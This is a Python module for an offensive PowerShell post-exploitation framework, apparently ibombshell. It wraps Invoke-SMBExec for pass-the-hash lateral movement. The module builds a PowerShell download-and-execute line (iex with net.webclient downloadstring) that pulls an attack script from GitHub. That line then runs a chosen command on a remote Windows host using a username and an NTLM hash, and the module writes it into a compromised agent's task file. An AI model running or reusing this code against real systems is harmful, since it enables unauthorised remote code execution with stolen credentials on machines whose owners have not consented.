from pathlib import Path

from termcolor import colored, cprint

from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Invoke-SMBExec",
                       "Description": "Execute SMBExec",
                       "Author": "Kevin Robertson",
                       "Link": "https://github.com/Kevin-Robertson/Invoke-TheHash",
                       "License": "BSD 3-Clause",
                       "Module": "@pablogonzalezpe, @toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "target": [None, "IP remote machine", True],
                    "domain": ["WORKGROUP", "Domain or WORKGROUP", True],
                    "username": ["Administrator", "Username", True],
                    "command": ["echo pwned > proof.txt", "Command to execute", True],
                    "hash": [None, "NTLM Hash", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):

        warrior_exist = False
        for p in Path("/tmp/").glob("ibs-*"):
            if str(p)[9:] == self.args["warrior"]:
                warrior_exist = True
                break

        if warrior_exist:
            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1');"
            function += 'Invoke-SMBExec -Target {} -Domain {} -Username {} -Hash {} -Command "{}"'.format(self.args["target"],self.args["domain"],self.args["username"],self.args["hash"],self.args["command"])

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
